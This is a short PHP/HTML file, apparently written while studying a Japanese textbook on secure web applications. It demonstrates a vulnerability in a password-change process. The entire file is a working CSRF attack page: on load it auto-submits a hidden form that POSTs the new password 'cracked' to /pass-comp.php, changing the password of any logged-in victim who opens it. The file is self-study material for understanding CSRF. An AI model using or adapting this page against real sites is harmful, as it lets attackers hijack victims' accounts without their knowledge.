<?php
/**
 *
 * 『「重要な処理」の際に混入する脆弱性』（安全なWebアプリケーションの作り方 p141~）
 * パスワード変更処理を題材にして
 *
 * *** CSRF攻撃用のHTMLファイル ***
 *
 * Created by IntelliJ IDEA.
 * User: xsmiledur
 * Date: 2017/06/12
 * Time: 15:13
 */

session_start();
$sid = $_GET['sid'];
?>

<body onload="document.forms[0].submit();">
    <form action="/pass-comp.php" method="POST">
        <input type="hidden" name="pass" value="cracked">
    </form>
</body>
